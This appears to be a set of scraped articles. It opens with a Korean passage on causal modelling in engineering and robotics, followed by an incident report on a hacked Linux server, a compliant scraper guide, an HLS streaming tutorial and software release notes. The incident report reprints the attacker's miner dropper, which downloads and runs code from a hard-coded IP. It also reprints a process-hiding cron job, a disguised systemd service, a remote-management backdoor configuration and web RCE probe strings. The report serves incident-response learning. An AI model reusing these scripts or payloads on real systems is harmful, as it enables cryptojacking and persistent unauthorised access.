반사실적 추론(Counterfactual Reasoning)은 고장 분석을 단순한 진단 이상으로 확장합니다. 고장이 발생한 이후 엔지니어는 냉각 성능(Cooling Performance)이 더 높았다면, 부하가 감소했다면, 유지보수가 더 일찍 수행되었다면, 또는 다른 제어기가 사용되었다면 동일한 고장이 발생했을지를 질문할 수 있습니다. 구조 방정식은 실제 사건과 관련된 배경 조건(Background Conditions)을 유지하면서 이러한 대안적 시나리오(Alternative Scenarios)를 평가하기 위한 프레임워크를 제공합니다.
인과적 고장 모델(Causal Failure Models)은 예방 정비(Preventive Maintenance)와 신뢰성 공학(Reliability Engineering)도 지원할 수 있습니다. 단순히 예측된 고장 확률(Failure Probability)을 기준으로 구성요소의 우선순위를 결정하는 대신, 시스템은 실행 가능한 어떤 개입이 실제 고장 확률을 감소시킬 것으로 예상되는지를 추정할 수 있습니다. 이는 위험 예측(Risk Prediction)과 위험 감소(Risk Reduction)를 구분합니다. 어떤 변수는 고장을 매우 잘 예측하면서도 실제 개입 대상으로서는 효과적이지 않을 수 있습니다.
로보틱스(Robotics)는 인지(Perception), 상태 추정(State Estimation), 계획(Planning), 제어(Control), 물리적 동역학(Physical Dynamics), 환경 상호작용(Environmental Interaction)이 서로 연결된 의사결정 시스템(Decision System)을 구성하기 때문에 인과 모델링에 특히 풍부한 환경을 제공합니다. 로봇은 지속적으로 주변 환경을 관찰하고 상태를 추정하며 행동을 선택하고 물리적 환경을 변화시킨 후 새로운 관측을 획득합니다. 인과 구조는 이러한 과정들이 행동과 임무 결과(Mission Outcomes)를 공동으로 어떻게 생성하는지를 표현할 수 있습니다.
예를 들어 지형 특성(Terrain Properties)은 휠 슬립(Wheel Slip), 진동(Vibration), 에너지 소비(Energy Consumption), 위치추정 불확실성(Localization Uncertainty), 달성 가능한 속도(Achievable Velocity)에 영향을 줄 수 있습니다. 제어기 결정은 명령 토크와 운동에 영향을 주며, 운동은 다시 미래의 센서 관측을 변화시킵니다. 인과 모델은 환경적 원인(Environmental Causes)과 제어기의 반응(Controller Responses)을 구분하여 어려운 지형에서 특정 제어기가 더 자주 선택되었다는 이유만으로 성능 저하의 원인을 해당 제어기에 잘못 귀속하는 것을 방지할 수 있습니다.
센서 분석(Sensor Analysis) 역시 인과적 추론의 이점을 얻을 수 있습니다. 비(Rain), 먼지(Dust), 조도(Illumination), 진동, 표면 형상(Surface Geometry)은 여러 인지 센서(Perception Sensors)와 하류의 위치추정 성능에 동시에 영향을 줄 수 있습니다. 센서 오류 사이의 상관관계가 센서 사이의 직접적인 상호작용을 의미하는 것은 아닙니다. 공통 환경 원인(Shared Environmental Causes)을 모델링하면 센싱 개선(Improved Sensing), 센서 융합(Sensor Fusion), 환경 적응(Environmental Adaptation), 추정기 재설계(Estimator Redesign) 가운데 어떤 개입이 가장 효과적인지를 판단하는 데 도움을 줍니다.
로봇 제어기 평가(Robot Controller Evaluation)는 관찰(Observation)과 개입의 차이를 잘 보여줍니다. 운영 로그에서는 보수적인 제어기(Conservative Controller)가 위험한 상황에서 주로 활성화되기 때문에 평균 속도가 낮고 고장률이 높게 나타날 수 있습니다. 따라서 제어기 사이의 원시 결과(Raw Outcomes)를 단순 비교하면 잘못된 결론을 내릴 수 있습니다. 인과적 조정(Causal Adjustment)을 이용하면 제어기 선택과 성능 모두에 영향을 주는 지형, 임무 난이도(Mission Difficulty), 페이로드(Payload) 등의 변수를 고려할 수 있습니다.
인과 모델은 관찰적 예측(Observational Predictions)만 수행하는 대신 개입 분포(Intervention Distributions)를 추정함으로써 행동 선택(Action Selection)을 추가로 지원할 수 있습니다. 로봇은 A를 행동(Action), Y를 미래 안전성(Future Safety), 에너지 사용(Energy Use), 작업 성공(Task Success), 또는 시스템 상태(System State)라고 할 때 P(Y | do(A = a))를 평가해야 할 수 있습니다. 이는 단순히 과거에 해당 행동이 발생했음을 관찰하는 것이 아니라 로봇이 의도적으로 특정 행동을 선택했을 때 어떤 결과가 발생할지를 명시적으로 질문합니다.
따라서 월드 모델(World Models)과 구조적 인과 모델은 로보틱스에서 서로 보완적으로 활용될 수 있습니다. 학습된 월드 모델은 센서와 행동 시퀀스(Sensor and Action Sequences)로부터 고차원 상태 전이(High-Dimensional State Transitions)를 표현하고, 인과 구조는 어떤 변수가 제어 가능한 행동(Controllable Actions), 환경 메커니즘(Environmental Mechanisms), 잠재적 외란(Latent Disturbances), 하류 결과(Downstream Consequences)를 나타내는지 구조화할 수 있습니다. 이러한 분리는 학습 데이터와 다른 정책이나 운영 환경에서도 추론 능력을 향상시킬 수 있습니다.
로보틱스의 고장 분석은 이러한 관점들을 결합할 수 있습니다. 내비게이션 고장(Navigation Failure)은 성능이 저하된 인지(Degraded Perception), 부정확한 위치추정(Poor Localization), 부적절한 계획(Unsuitable Planning), 액추에이터 한계(Actuator Limitations), 통신 지연(Communication Delays), 환경 조건 등으로부터 발생할 수 있습니다. 인과 그래프는 이러한 메커니즘과 경쟁적인 고장 경로(Failure Pathways)를 구조화하고, 운영 로그와 표적 실험(Targeted Experiments)은 각각의 관계 강도를 추정하기 위한 증거를 제공합니다.
개입은 이러한 모델을 검증하는 데 특히 유용합니다. 엔지니어는 페이로드, 속도, 제어기 파라미터(Controller Parameters), 센서 구성, 지형 조건, 통신 품질(Communication Quality)을 의도적으로 변화시키면서 하류 효과를 측정할 수 있습니다. 이러한 통제된 변화는 관찰 로그만으로는 구별할 수 없는 인과 메커니즘을 분리하고 인과적 식별(Causal Identification)이나 인과 발견(Causal Discovery) 과정에서 나타난 모호성을 해결하는 데 도움을 줍니다.
시스템 모델링, 고장 분석, 로보틱스에서는 시간(Time)도 신중하게 다루어야 합니다. 원인은 하류 결과보다 먼저 발생해야 하지만 시간적 선행성(Temporal Precedence)만으로 인과관계가 성립하는 것은 아닙니다. 동적 인과 모델(Dynamic Causal Models)은 상태 Sₜ, 행동 Aₜ, 외란 Uₜ, 미래 상태 Sₜ₊₁을 표현할 수 있으며, 보다 긴 인과적 연쇄는 반복되는 상호작용이 어떻게 누적되어 열화, 적응(Adaptation), 임무 수준 결과(Mission-Level Outcomes)를 발생시키는지를 설명할 수 있습니다.
도메인 지식(Domain Knowledge)을 명시적으로 포함하면 인과 모델링의 실용적 가치가 더욱 높아집니다. 엔지니어링 아키텍처는 불가능한 인과 방향을 제거할 수 있고, 물리 방정식(Physical Equations)은 구조 함수(Structural Functions)를 제약할 수 있으며, 유지보수 기록(Maintenance Records)은 실제 개입을 식별하는 데 활용될 수 있고, 로봇 로그는 시간적 증거(Temporal Evidence)를 제공할 수 있습니다. 이러한 제약은 가능한 인과 모델의 수를 줄이고 통계적으로 편리한 관계가 실제 물리적 메커니즘으로 잘못 해석되는 것을 방지합니다.
따라서 유용한 엔지니어링 작업 흐름(Engineering Workflow)은 구조적 지식(Structural Knowledge), 관찰 데이터, 표적 실험을 결합합니다. 엔지니어는 먼저 변수와 인과적 질문(Causal Question)을 정의하고, 물리적 지식과 시스템 지식을 바탕으로 초기 그래프를 구성하며, 교란과 식별 가능성(Identifiability)을 분석하고, 이용 가능한 데이터에서 식별 가능한 효과를 추정합니다. 이후 불확실한 관계를 구별하기 위한 통제된 실험을 설계하고 그 결과를 이용하여 제안된 모델의 일부를 수정하거나 기각할 수 있습니다.
이러한 응용 분야 전반에서 구조적 인과 모델(Structural Causal Models)의 핵심적인 장점은 단순한 예측에서 개입 중심의 이해(Intervention-Oriented Understanding)로 전환할 수 있다는 것입니다. 시스템 모델링은 변화가 시스템을 통해 어떻게 전파되는지를 설명하고, 고장 분석은 실제로 변경할 수 있는 메커니즘을 식별하며, 로보틱스는 의도적으로 수행된 행동의 결과를 평가합니다. 이러한 응용은 인과 모델이 복잡한 엔지니어링 시스템에서 진단(Diagnosis), 설계 최적화(Design Optimization), 신뢰성, 자율성(Autonomy), 더욱 안전한 의사결정(Safer Decision-Making)을 지원할 수 있음을 보여줍니다.

articles.title: My Server Got Hacked: 15 Hours Fighting Crypto Miners and Hidden Backdoors
articles.description:
It was supposed to be a relaxing Friday evening.
Instead, I received an alarming message from my cloud provider:
"A large amount of outbound traffic is being generated from your server to a Chinese IP address."
I immediately connected to the server via SSH.
The CPU usage was nearly 100%.
What followed was approximately 15 hours of incident response, involving cryptocurrency miners, hidden systemd services, multiple persistence mechanisms, a remote management backdoor, and a suspected Next.js vulnerability.
Here's what happened, what I discovered, and what I learned.
After receiving the warning from my cloud provider, the first thing I did was run:
top

One process immediately caught my attention:
PID      USER  PR NI  VIRT  RES   SHR  S  %CPU  %MEM  COMMAND
2096450  root  20  0   7820  1368  1168 R  93.3  0.0   strings

Wait... strings?
Why was a simple utility consuming over 90% of the CPU?
I killed the process.
But it came back.
Every time I terminated it, another process appeared with a different PID.
Clearly, something was keeping it alive.
I started tracing the parent-child relationships using pstree.
pstree -ap

The result revealed something interesting:
systemd,1
 └─sh,882056 /dev/health.sh
     ├─grep,2110109 -q xmrig
     └─strings,2110108 /proc/2497/exe

There was a shell script running from:
/dev/health.sh

I had never created this script.
Even more suspiciously, five instances of it were running simultaneously.
I opened the script to understand what it was doing.
while true; do
    for proc_dir in /proc/[0-9]*; do
        pid=${proc_dir##*/}

        if strings "/proc/$pid/exe" 2>/dev/null | grep -q xmrig; then
            kill -9 "$pid"
            continue
        fi

        result=$(ls -l "/proc/$pid/exe" 2>/dev/null)

        case "$result" in
            *"(deleted)"* | *"xmrig"* | *"watcher"* | *"/tmp/a"* | *"softirq"* | *"rondo"*)
                kill -9 "$pid"
                ;;
        esac
    done

    sleep 45
done

This script continuously scanned running processes every 45 seconds.
It inspected executable files under /proc and terminated processes matching specific patterns, including:
xmrig
watcher
softirq
rondo
/tmp/a
Interestingly, the script appeared to be killing other mining processes.
My interpretation was that the attacker wanted to eliminate competing miners and maintain exclusive access to the server's computing resources.
However, this script was only part of the infection.
The more important file was located at:
/dev/shm/bts

Its contents explained how the mining operation worked.
#!/bin/bash

pkill -9 xmrig

P="fghgf"
R="/dev"

if ! pgrep $P > /dev/null; then
    busybox wget http://193.34.213.150/nuts/x -O->/tmp/$P
    busybox wget http://193.34.213.150/nuts/lc -O->/tmp/config.json

    chmod 777 /tmp/$P
    /tmp/$P -c /tmp/config.json -B &
fi

if ! pgrep "health.sh"; then
    cat <<'EOF' > "${R}/health.sh"
    # ... health.sh content auto-generated ...
EOF

    chmod 777 "${R}/health.sh"
    ${R}/health.sh &
fi

echo MEOWWWWWWWWW

The execution flow was relatively straightforward:
Kill existing xmrig processes.
Download a mining executable and configuration file from an attacker-controlled server.
Make the downloaded executable runnable.
Launch the miner in the background.
Recreate health.sh if it is missing.
And finally:
echo MEOWWWWWWWWW

Yes. The attacker actually left a MEOWWWWWWWWW message in the script.
Not exactly what I expected to find during a security incident.
The payload was not simply a standalone miner.
It also included mechanisms to maintain the mining operation and interfere with other processes.
This meant that killing one suspicious process would not necessarily stop the infection.
Unfortunately, I learned that lesson the hard way.
At this point, I believed I had identified the malicious components.
I terminated the suspicious processes:
pkill -9 -f "health.sh"
pkill -9 -f "fghgf"

Then removed the files:
rm -f /dev/health.sh
rm -f /dev/shm/bts
rm -f /tmp/fghgf
rm -f /tmp/config.json

I also blocked the identified IP address using UFW:
ufw deny out to 193.34.213.150
ufw deny in from 193.34.213.150

Additionally, I applied country-based access restrictions through my cloud provider's firewall.
The CPU usage returned to normal.
Everything looked fine.
I thought the incident was over.
It wasn't.
Around 10 AM, I checked the server again.
The CPU usage had reached 200%.
A new suspicious process was running:
PID      USER  PR NI  VIRT  RES  SHR  S  %CPU   COMMAND
2313800  root  20  0   ...   ...  ...  R  200.0  p9gzSA

This time, the executable had a different name.
p9gzSA

Its command line revealed another mining endpoint:
/root/aO7j/p9gzSA -o www.digitaloceana.top:80 --tls

The attacker was not relying on a single executable or endpoint.
My initial cleanup had removed the visible symptoms, but something deeper was still active.
I decided to investigate the entire system.
While examining system services, I discovered a suspicious unit file:
cat /usr/lib/systemd/system/systemd-agent.service

Its contents were:
[Unit]
Description=System Daemon
Wants=network-online.target
After=network-online.target

[Service]
ExecStart=/bin/systemd-daemon --user
Restart=always
User=root

[Install]
WantedBy=multi-user.target

At first glance, the name looked legitimate.
systemd-agent.service
The description was equally generic:
System Daemon
But the service was not part of my intended system configuration.
Several details stood out:
Restart=always would restart the process whenever it exited.
User=root meant the executable ran with root privileges.
WantedBy=multi-user.target allowed the service to be enabled for normal system startup.
The executable name resembled a legitimate system component.
This explained why simply killing processes was not enough.
The system itself could restart the malicious executable.
During further analysis, I identified four hardcoded IP addresses associated with the suspicious components:
185.247.224.41
87.98.162.88
82.221.103.244
67.215.246.10

The attacker had apparently prepared multiple endpoints rather than depending on a single server.
Blocking one address was never going to be a complete solution.
The next discovery was even more concerning.
I found a directory containing a MeshAgent executable:
ls /usr/local/mesh_services/meshagent/

Output:
meshagent

MeshAgent is associated with MeshCentral, a legitimate remote device management platform.
But in this context, I had never authorized its installation.
The configuration referenced:
MeshServer: wss://72.62.67.33:443/agent.ashx
MeshName: all_notcloud

This suggested that the attacker had installed a remote management agent.
The incident was no longer just about cryptocurrency mining.
An unauthorized remote management tool could potentially provide persistent access to the compromised server.
I also discovered an unusual crontab entry:
* * * * * pgrep -f meshagent | while read pid; do \
    mountpoint -q /proc/$pid || mount -o bind /tmp/empty /proc/$pid 2>/dev/null; \
done

This command ran every minute.
It attempted to bind-mount /tmp/empty over /proc/$pid for processes matching meshagent.
This appeared to be an attempt to interfere with process inspection or visibility, although the precise effect would depend on the mount configuration and whether the command succeeded.
By this point, I had identified multiple layers of suspicious activity:
Cryptocurrency mining processes
Scripts that recreated malicious components
A disguised systemd service
Multiple external endpoints
An unauthorized remote management agent
A cron-based process manipulation mechanism
Removing the miner alone was clearly insufficient.
I realized that my first response had focused entirely on removing malicious files.
I had not answered the most important question:
How did the attacker get into the server in the first place?
I started by reviewing SSH authentication logs.
grep -i "Accepted" /var/log/auth.log

I couldn't find evidence of a suspicious external SSH login.
That pushed my investigation toward the web applications hosted on the server.
I reviewed the web server access logs chronologically.
The activity suggested that reconnaissance attempts had begun in late November.
More aggressive attack traffic appeared around December 2.
On December 5, I found evidence of remote code execution attempts.
On December 6, the logs showed a large-scale scan involving numerous potential RCE vectors within a short period.
Some of the suspicious requests targeted:
/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
php://input
eval-stdin.php
call_user_func_array
pearcmd&+config-create

These corresponded to well-known attack techniques:



Payload / Target
Suspected Attack Type




/cgi-bin/.%2e/.../bin/sh
Path traversal


php://input
PHP code execution


eval-stdin.php
PHPUnit RCE


call_user_func_array
ThinkPHP RCE


pearcmd&+config-create
PEAR command injection



The attacker, or automated scanning infrastructure, appeared to be probing a variety of known vulnerabilities.
But one application stood out.
The server was also hosting a Next.js application.
While reviewing the access logs, I noticed numerous POST requests targeting endpoints associated with React Server Components and Server Actions.
Examples included:
POST /_next/flight
POST /_react/flight
POST /_next/server-actions

These requests raised concerns about exploitation attempts targeting React Server Components serialization and deserialization behavior.
At the time of the incident, critical RCE vulnerabilities affecting React Server Components and certain Next.js deployments had become a major security concern.
The observed traffic was consistent with attempts to exploit this class of vulnerability.
Several observations pointed toward the application:
The server was running a Next.js project.
The access logs contained suspicious POST traffic targeting RSC-related endpoints.
The incident occurred during a period of active exploitation of RSC-related vulnerabilities.
My first cleanup did not address the potentially vulnerable application.
The server experienced another mining incident after the initial removal.
Based on the evidence available to me, the Next.js application was the strongest suspected entry point.
However, the access logs alone did not conclusively prove which request achieved code execution.
Confirming the exact exploit would require additional evidence, such as payload analysis, application version verification, process execution telemetry, or forensic correlation.
The important lesson was unchanged:
Removing malware without addressing the vulnerability that may have allowed the intrusion leaves the system exposed.
After discovering the multiple persistence mechanisms, I no longer trusted the integrity of the operating system.
The suspicious components had operated with root privileges.
There was no reliable way to guarantee that every malicious modification had been discovered.
Instead of continuing to remove individual files, I chose to rebuild.
The response included:
Applying security patches and updating vulnerable application dependencies.
Decommissioning the compromised server.
Migrating the application to a newly provisioned server.
Reviewing firewall and network access rules.
Reassessing the application's exposed attack surface.
The old server was ultimately removed.
A clean environment was the safer choice than continuing to operate a system whose integrity could no longer be trusted.
During my first response, I treated the CPU returning to normal as a sign of success.
That was my biggest mistake.
The miner had stopped, but persistence mechanisms remained.
In this incident, I discovered suspicious components involving:
Shell scripts
systemd services
Cron jobs
Remote management software
Finding one malicious process does not mean you have found the entire compromise.
Deleting the payload does not fix the vulnerability that allowed it to execute.
Incident response must include identifying and addressing the original entry point wherever possible.
Once an attacker has gained root-level execution, manually removing suspicious files cannot establish that the system is trustworthy again.
Rebuilding from a known-good environment is often the safest recovery approach.
Without web server access logs, I would have had very little information about the attack timeline.
The chronological log analysis helped me understand how the incident developed and where to focus the investigation.
Even a small web application can become an entry point for a much larger compromise.
Keeping frameworks, runtimes, and dependencies updated is essential.
What started as a suspicious CPU spike turned into a 15-hour investigation.
I found cryptocurrency miners, a disguised systemd service, multiple external endpoints, an unauthorized MeshAgent installation, and evidence suggesting attempts to exploit a Next.js RSC vulnerability.
The most important lesson was simple:
Don't just remove the malware. Find out how it got there, eliminate persistence, and restore trust in the environment.
During the first response, I focused on making the symptoms disappear.
During the second response, I finally started investigating the underlying compromise.
That difference changed how I think about server security and incident response.
If you've dealt with a similar Linux server compromise, I'd be interested to hear what persistence mechanisms you encountered and how you approached recovery.
Originally published on my personal blog: Server Gets Hacked — Crypto Miner Incident Response
All IP addresses, domains, commands, and process names shown in this article were observed during the incident. They are included for security research and incident analysis purposes. Their presence does not establish current malicious activity or attribution.

articles.title: Building a Reliable FMCSA Carrier Data Scraper with Python and Playwright
articles.description:
TL;DR: Public FMCSA carrier records are useful for logistics research, but a fragile script will get you blocked or produce dirty data. This guide walks through a production-minded Playwright scraper: respectful rate limits, retries with backoff, MC/USDOT hygiene, and clear compliance boundaries—without inventing shortcuts past access controls.
U.S. freight and brokerage teams routinely look up carriers by MC or USDOT number: authority status, legal name, address, and equipment hints. Much of that is published as public records. The hard part is not “can I fetch HTML?”—it is keeping a long-running collector stable when pages change, when the network flakes, and when you need clean, deduplicated rows for a CRM or directory.
Playwright fits this job because it:
Speaks modern Chromium (and Firefox/WebKit) with a stable API
Handles waits for network and DOM more predictably than older Selenium patterns
Gives you request interception, tracing, and storage state for sessions you are allowed to use
This article is about authorized, public-page collection. It is not about bypassing logins, CAPTCHAs, paywalls, or private APIs. If a site’s terms require written permission for automated access, get that first.
A scraper that lasts usually has four layers:
Seed list — MC/USDOT numbers or search queries you already have a right to process


Fetcher — Playwright (or HTTP where a stable public API exists)


Normalizer — parse → typed fields → MC/USDOT cleanup → dedupe keys


Sink — CSV/SQLite/Postgres plus a run log (what succeeded, what failed, why)
Keep secrets out of the repo. Put rate limits and user-agent policy in config, not hard-coded in five places.
# config.py — illustrative defaults, tune per target and permission
RATE_LIMIT_SECONDS = 2.5      # pause between page navigations
MAX_RETRIES = 4
BACKOFF_BASE = 2.0            # exponential: 2, 4, 8, 16...
REQUEST_TIMEOUT_MS = 45_000
USER_AGENT = (
    "INDUSResearchBot/1.0 (+https://www.induswebagency.com; research; contact=induswebagency@gmail.com)"
)

Identify your bot. A clear User-Agent and a contact URL make it easier for operators to reach you if something goes wrong—and it is basic good citizenship.
Prefer Playwright’s auto-waiting locators over fixed time.sleep calls. Sleeps still belong in the rate limiter between independent navigations.
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
import time, random

def polite_pause(base: float = RATE_LIMIT_SECONDS) -> None:
    # small jitter so traffic is not perfectly periodic
    time.sleep(base + random.uniform(0.1, 0.6))

def fetch_carrier_page(page, url: str) -> str:
    page.goto(url, wait_until="domcontentloaded", timeout=REQUEST_TIMEOUT_MS)
    # Wait for a stable landmark on the public record page—adjust selector to the live DOM
    page.wait_for_selector("[data-carrier-record], .carrier-details, main", timeout=20_000)
    return page.content()

Use domcontentloaded when you do not need every third-party asset. Prefer a specific selector for the record block once you know the page structure.
Retries should be idempotent and bounded. Retry timeouts and 5xx-class failures; do not blindly retry on “record not found.”
from tenacity import retry, stop_after_attempt, wait_exponential, retry_if_exception_type

class TransientFetchError(Exception):
    pass

@retry(
    reraise=True,
    stop=stop_after_attempt(MAX_RETRIES),
    wait=wait_exponential(multiplier=1, min=2, max=60),
    retry=retry_if_exception_type((PlaywrightTimeout, TransientFetchError)),
)
def fetch_with_retries(page, url: str) -> str:
    try:
        html = fetch_carrier_page(page, url)
        # Example: detect a soft error banner if the site returns 200 with an error body
        if "temporarily unavailable" in html.lower():
            raise TransientFetchError("soft 503-style body")
        return html
    except PlaywrightTimeout:
        raise

Log every attempt: URL, attempt number, exception type, elapsed ms. Without that log, “the scraper is broken” becomes guesswork.
Dirty logistics data is worse than no data. Normalize before you store.
import re

MC_RE = re.compile(r"^(?:MC)?[\s\-]?(\d{1,8})$", re.I)
DOT_RE = re.compile(r"^(?:USDOT|DOT)?[\s\-]?(\d{1,9})$", re.I)

def normalize_mc(raw: str | None) -> str | None:
    if not raw:
        return None
    m = MC_RE.match(raw.strip())
    return f"MC{int(m.group(1))}" if m else None  # strip leading zeros via int()

def normalize_usdot(raw: str | None) -> str | None:
    if not raw:
        return None
    m = DOT_RE.match(raw.strip())
    return f"USDOT{int(m.group(1))}" if m else None

def dedupe_key(mc: str | None, usdot: str | None, legal_name: str | None) -> str:
    if usdot:
        return usdot
    if mc:
        return mc
    # last resort — never preferred
    return (legal_name or "").strip().upper()

Also:
Trim and collapse whitespace in names and addresses

Uppercase state codes; keep ZIP as text so leading zeros survive

Store source_url and collected_at (UTC) on every row

Reject rows with neither MC nor USDOT unless your use case truly needs name-only stubs




  
  
  Staying compliant (non-negotiable)


Compliance is part of the engineering, not a footer disclaimer.
Public pages only unless you have written authorization for authenticated areas


No CAPTCHA/paywall bypass, no credential stuffing, no private API reverse engineering presented as “scraping tips”


Respect robots.txt and terms for the specific host you hit; when terms require permission, ask


Rate limit so you do not look like a denial-of-service


PII: do not scrape personal emails/phones from places that are not meant for bulk collection; carrier company public records are a different category from personal contact harvesting


Purpose limitation: keep the collector scoped to research / CRM enrichment you are allowed to do



If you ship a tool for others (browser extension or CLI), put explicit authorization checkboxes in the UI before any multi-page crawl. That pattern shows up in responsible logistics tooling for a reason.
def run(seeds: list[dict]) -> None:
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context(user_agent=USER_AGENT)
        page = context.new_page()
        for seed in seeds:
            url = seed["url"]
            polite_pause()
            try:
                html = fetch_with_retries(page, url)
                record = parse_carrier_html(html)  # your parser
                record["mc"] = normalize_mc(record.get("mc"))
                record["usdot"] = normalize_usdot(record.get("usdot"))
                record["dedupe_key"] = dedupe_key(
                    record["mc"], record["usdot"], record.get("legal_name")
                )
                record["source_url"] = url
                upsert(record)  # SQLite/Postgres with unique(dedupe_key)
            except Exception as exc:
                log_failure(url, exc)
        browser.close()

Start with a dry-run mode that writes parsed JSON to disk and never upserts. Validate 20–50 known carriers by hand before you trust a full seed list.
Headless CI job with a nightly seed slice, plus a manual “full refresh” path

Schema migrations when the DOM changes (version your parser)

Alerts when failure rate crosses a threshold (example: >5% hard failures in a run)

Export that matches what humans expect: CSV with stable column names for ops teams




  
  
  FAQ


Q: Can I scrape FMCSA-related sites as fast as my connection allows?

A: No. Bound concurrency, pause between navigations, and follow the host’s terms. Speed is not a feature if it gets you blocked or creates legal risk.
Q: Should I use raw HTTP instead of Playwright?

A: Use HTTP when the data is available from a documented public endpoint or a simple static page. Use Playwright when the record is rendered by JavaScript or needs a real browser context you are allowed to drive.
Q: How do I avoid duplicate carriers across runs?

A: Normalize MC/USDOT first, then upsert on USDOT (preferred) or MC. Keep a run log so you can re-fetch only failures.
Q: Is storing public carrier company data the same as scraping personal contacts?

A: No. Company authority records and personal phone/email harvesting are different risk profiles. Stay away from personal contact scraping unless you have a clear lawful basis and permission.
Need a production-minded Python scraper or carrier directory for logistics ops? INDUS Web Agency builds compliant automation for freight and dispatch teams.

articles.title: Adaptive bitrate streaming with HLS, explained for web developers
articles.description:
Disclosure: I work at TPStreams, a video hosting and streaming platform. This post explains the general technique, which applies whichever provider (or none) you use.
If you've ever put an MP4 behind a <video> tag and watched it stall on a phone over 4G, you've hit the problem adaptive bitrate (ABR) streaming solves. Here's how it works with HLS, the format you'll meet most often.
A single MP4 has one resolution and one bitrate. Encode it at 1080p and 5 Mbps and viewers on slow connections buffer; encode it at 480p and everyone on fibre gets a blurry picture. The network a viewer has at minute one is also not the network they have at minute ten.
ABR fixes this with two moves:
Encode several renditions of the same video, for example 240p, 360p, 480p, 720p and 1080p, each at a different bitrate.
Cut each rendition into short segments (typically 2 to 6 seconds) aligned at the same timestamps, so the player can switch rendition at any segment boundary.
The player measures how fast segments are downloading and picks the best rendition the connection can sustain, switching up or down as conditions change.
HLS (HTTP Live Streaming) describes all this with plain-text playlists (.m3u8).
The multivariant (master) playlist lists the renditions:
#EXTM3U
#EXT-X-STREAM-INF:BANDWIDTH=800000,RESOLUTION=640x360,CODECS="avc1.4d401e,mp4a.40.2"
360p/index.m3u8
#EXT-X-STREAM-INF:BANDWIDTH=1400000,RESOLUTION=854x480,CODECS="avc1.4d401f,mp4a.40.2"
480p/index.m3u8
#EXT-X-STREAM-INF:BANDWIDTH=2800000,RESOLUTION=1280x720,CODECS="avc1.4d401f,mp4a.40.2"
720p/index.m3u8
#EXT-X-STREAM-INF:BANDWIDTH=5000000,RESOLUTION=1920x1080,CODECS="avc1.640028,mp4a.40.2"
1080p/index.m3u8

Each media playlist lists that rendition's segments:
#EXTM3U
#EXT-X-VERSION:7
#EXT-X-TARGETDURATION:6
#EXT-X-PLAYLIST-TYPE:VOD
#EXT-X-MAP:URI="init.mp4"
#EXTINF:6.0,
seg_0001.m4s
#EXTINF:6.0,
seg_0002.m4s
#EXT-X-ENDLIST

Everything is served over ordinary HTTP, so any CDN can cache it. That is a big reason HLS won: no special streaming server is needed.
A minimal two-rendition ladder:
ffmpeg -i input.mp4 \
  -filter_complex "[0:v]split=2[v1][v2];[v1]scale=-2:720[v720];[v2]scale=-2:360[v360]" \
  -map "[v720]" -c:v:0 libx264 -b:v:0 2800k -maxrate:v:0 3000k -bufsize:v:0 5600k \
  -map "[v360]" -c:v:1 libx264 -b:v:1 800k -maxrate:v:1 900k -bufsize:v:1 1600k \
  -map a:0 -map a:0 -c:a aac -b:a 128k \
  -g 48 -keyint_min 48 -sc_threshold 0 \
  -f hls -hls_time 6 -hls_playlist_type vod \
  -hls_segment_type fmp4 \
  -master_pl_name master.m3u8 \
  -var_stream_map "v:0,a:0 v:1,a:1" \
  out/%v/index.m3u8

The flags that matter most for ABR:
-g, -keyint_min and -sc_threshold 0 give a fixed keyframe interval (2 seconds at 24 fps here), so every rendition has keyframes at the same points. Without aligned keyframes, switching causes visible glitches.
-maxrate and -bufsize cap bitrate spikes, so the BANDWIDTH value the player relies on is honest.
-hls_time sets segment length. Shorter segments react faster to network changes but mean more requests.
Safari plays HLS natively. Elsewhere, use a library such as hls.js:
<video id="v" controls></video>
<script src="https://cdn.jsdelivr.net/npm/hls.js@1"></script>
<script>
  const video = document.getElementById('v');
  const src = '/out/master.m3u8';
  if (video.canPlayType('application/vnd.apple.mpegurl')) {
    video.src = src;
  } else if (Hls.isSupported()) {
    const hls = new Hls();
    hls.loadSource(src);
    hls.attachMedia(video);
    hls.on(Hls.Events.LEVEL_SWITCHED, (_, d) =>
      console.log('Now playing level', d.level));
  }
</script>

Open DevTools, go to the Network tab, throttle to "Slow 4G", and you'll see the player drop to the 360p segments, then climb back up when you remove the throttle.
Unaligned keyframes across renditions (see above).
A ladder that's too sparse. Jumping straight from 360p to 1080p makes every switch obvious. Add steps in between.
No low rung. A 240p rendition at a few hundred kbps keeps mobile viewers watching instead of buffering.
Forgetting CORS on the CDN when the player page and the segments live on different domains.
Treating HLS as security. Splitting a video into segments does not stop downloading; tools reassemble HLS easily. Protection needs encryption, DRM (Widevine and FairPlay) and access tokens, which is a separate topic.
Running FFmpeg yourself is fine for a handful of videos. At scale you'll also need a job queue, storage, a CDN, captions, analytics and possibly DRM. Managed services such as Mux, Cloudflare Stream, Bunny Stream, Gumlet, VdoCipher, AWS Elemental MediaConvert and TPStreams generate the rendition ladder for you; compare them on output formats, DRM support, pricing model and where your viewers are.
If you want to see how we handle multi-rendition transcoding (240p to 4K, HLS and DASH), it's described here: https://tpstreams.com/transcoding-video/

articles.title: RagLeap v0.13.1 and ragleap-memory 0.3.0: Better Action Auditing and Optional Vector Search
articles.description:
RagLeap has two new releases focused on an important part of building reliable AI systems: understanding what agents do and improving how they retrieve information.
ragleap-core v0.13.1 introduces structured audit log lines for agent actions.
ragleap-memory 0.3.0 adds optional vector and hybrid search using an embedder function supplied by the developer.
Both releases are open-source and designed for self-hosted environments.
AI agents can propose and execute actions across different channels. As these systems become more capable, understanding what happened during an action becomes increasingly important.
RagLeap Core v0.13.1 introduces structured JSON audit log lines through the ragleap.audit logger.
Every supported agent action writes an audit line beginning with AUDIT.
The new audit events include:
action_proposed
action_executed
action_error
action_rejected
action_skipped
action_forced_approval
Each event includes structured information such as:
UTC timestamp
Action type
Channel and agent role
Target, limited to 200 characters
Approval or rejection details
An action_id connecting a proposal to its decision
SHA-256 hashes of the content and result
An important privacy detail: The actual content text is not written into these audit lines. This makes it possible for operators to retain structured action records without placing the underlying text in this particular log output.
The lines can also be collected and retained using an external log shipper.
To disable structured audit log lines:
AUDIT_LOG_LINES=false
This is a small application change:
No database schema change
No new API route
No new dependency
Rebuild and restart the application
There are also important limitations. GET reads, chat routes, per-step agent-run events, approved-action send failures, and database-table retention or purge controls are not covered yet.
Audit logs alone do not make an installation compliant with any law or security standard. Log retention depends on the operator's infrastructure and configuration.
